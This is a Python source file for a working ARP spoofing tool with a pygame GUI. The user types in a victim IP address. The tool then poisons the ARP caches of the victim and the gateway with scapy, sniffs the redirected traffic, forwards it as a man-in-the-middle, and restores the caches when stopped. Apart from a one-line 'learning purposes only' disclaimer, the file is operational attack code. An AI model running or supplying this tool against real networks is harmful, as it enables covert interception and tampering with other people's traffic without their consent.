import scapy.all as scapy
import time
import threading
from scapy.all import conf, IP, sniff, sendp, Ether, arping
import pygame
import pygame_gui
from button import Button
import sys
import re

"""
THIS CODE IS FOR LEARNING PURPOSES ONLY!
"""


class SpoofGui:
    def __init__(self):
        pygame.init()
        self.width, self.height = 700, 500
        self.display = pygame.display
        self.screen = self.display.set_mode((self.width, self.height))
        self.display.set_caption("Arp Spoofer")
        self.manager = pygame_gui.UIManager((self.height, self.width))
        self.clock = pygame.time.Clock()
        self.input_field = pygame_gui.elements.UITextEntryLine(
            relative_rect=pygame.Rect((200, 300), (300, 35)),
            manager=self.manager,
            object_id='#username_text_entry_login')
        self.spoof_bt = Button(text_input="start spoofing", pos=(350, 100))

        self.display.set_caption("Arp spoofer")
        self.icon = pygame.image.load("assets/spoof_icon.png")
        pygame.display.set_icon(self.icon)

        self.regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        self.spoof = None
        self.main_run = True
        self.data_run = True

    def run(self):
        while self.main_run:
            mouse_pos = pygame.mouse.get_pos()
            self.spoof_bt.change_color(mouse_pos)
            for event in pygame.event.get():
                self.manager.process_events(event)
                if event.type == pygame.QUIT:
                    if self.spoof:
                        self.spoof.stop_spoof()
                    pygame.quit()
                    sys.exit()
                elif event.type == pygame.MOUSEBUTTONDOWN:
                    if self.spoof_bt.check_for_input(mouse_pos):
                        self.check_ip(self.input_field.get_text())

            self.manager.update(self.clock.tick(60) / 1000)
            self.manager.draw_ui(self.screen)
            # self.screen.fill((255, 255, 255))
            self.spoof_bt.update(self.screen)
            self.display.flip()

    def display_spoof_data(self):
        self.screen.fill("black")
        while True:
            for event in pygame.event.get():
                self.manager.process_events(event)
                if event.type == pygame.QUIT:
                    if self.spoof:
                        self.spoof.stop_spoof()
                    pygame.quit()
                    sys.exit()

            self.draw_text("your pc:", self.get_font(None, 45), color="Blue", x=45, y=100)
            self.draw_text(f"ip: {self.spoof.ip}, mac: {self.spoof.my_mac}", self.get_font(None, 35), x=45, y=150)
            self.draw_text("victim:", self.get_font(None, 45), color="Green", x=45, y=200)
            self.draw_text(f"ip: {self.spoof.victim_ip}, mac: {self.spoof.victim_mac}", self.get_font(None, 35), x=45, y=250)
            self.draw_text("gateway:", self.get_font(None, 45), color="Yellow", x=45, y=300)
            self.draw_text(f"ip: {self.spoof.gateway_ip}, mac: {self.spoof.gateway_mac}", self.get_font(None, 35), x=45, y=350)

            self.display.flip()

    def check_ip(self, ip):
        if not re.search(self.regex, ip):
            self.draw_text("Invalid Ip address", self.get_font(None, 30), color="red", x=220, y=345)
        else:
            self.spoof = ArpSpoofing(ip)
            self.spoof.start_spoof()
            self.main_run = False
            self.display_spoof_data()

    @staticmethod
    def get_font(font, size):  # Returns Press-Start-2P in the desired size
        return pygame.font.Font(font, size)

    def draw_text(self, text, font, color="white", x=0, y=0):
        text = font.render(text, True, color)
        self.screen.blit(text, (x, y))


class ArpSpoofing:
    def __init__(self, victim_ip: str):
        """
        :param victim_ip: gets the victim (target) ip
        """
        self.ip = scapy.get_if_addr(conf.iface)
        self.my_mac = self.get_mac(self.ip)
        self.victim_ip = victim_ip  # Enter your target IP
        self.victim_mac = self.get_mac(self.victim_ip)
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.running = True

        self.handle_t = None
        self.run_spoof_t = None

    @staticmethod
    def get_mac(ip):
        """
        :param ip: the ip needed to get its mac address
        :type ip: str
        :return: the mac address that belongs to the ip
        :rtype: str
        """
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            print("ip addr is not in lan")

    def spoof(self, victim_ip, spoof_ip):
        """
        :param victim_ip: the ip address that being spoofed in thr arp cache
        :type victim_ip: str
        :param spoof_ip: the ip address the spoofer use to spoof the arp cache
        :type spoof_ip: str
        """
        packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=self.get_mac(victim_ip), psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        """
        :param destination_ip: the ip address that being restored in thr arp cache
        :type destination_ip: str
        :param source_ip: the ip address the spoofer use to restore the arp cache
        :type source_ip: str
        """
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        # packet.show()
        scapy.send(packet, verbose=False)

    def run_spoofer(self):
        try:
            sent_packets_count = 0
            while self.running:
                self.spoof(self.victim_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.victim_ip)
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                time.sleep(2)  # Waits for two seconds

        except KeyboardInterrupt:
            self.stop_spoof()

    def stop_spoof(self):
        self.running = False
        print("\nCtrl + C pressed.............Exiting")
        self.restore(self.gateway_ip, self.victim_ip)
        self.restore(self.victim_ip, self.gateway_ip)
        print("[+] Arp Spoof Stopped")

    def handle_packets(self):
        """
        sniffs all the ports for packets and filters it with the pack_filter
        """
        while True:
            sniff(iface="‏‏Ethernet", lfilter=self.pack_filter, prn=self.send_packet)

    def pack_filter(self, pkt):
        """
        filters the right packets with the mac addresses
        """
        return Ether in pkt and IP in pkt and \
            ((pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac)
             or
             (pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac))

    def send_packet(self, pkt):
        """
        :param pkt: packet that needs to be rerouted
        """
        if pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac and pkt[IP].src == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.gateway_mac

        elif pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac and pkt[IP].dst == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.victim_mac

        # sends a packet on the Ethernet layer
        sendp(pkt, verbose=False)

    def start_spoof(self):
        self.handle_t = threading.Thread(target=self.handle_packets, daemon=True)
        self.handle_t.start()
        self.run_spoof_t = threading.Thread(target=self.run_spoofer, daemon=True)
        self.run_spoof_t.start()


def arp_ping():
    """
    this function prints all the ips on the same lan
    :return:
    """
    try:
        ip = scapy.get_if_addr(conf.iface).split(".")
        ip[-1] = "0"
        arping(".".join(ip) + "/24")
    except ImportError:
        print("Couldn't Import Scapy ")
    except KeyError:
        print("ARP Scan didn't work right...")


def main():
    sg = SpoofGui()
    sg.run()


if __name__ == '__main__':
    main()
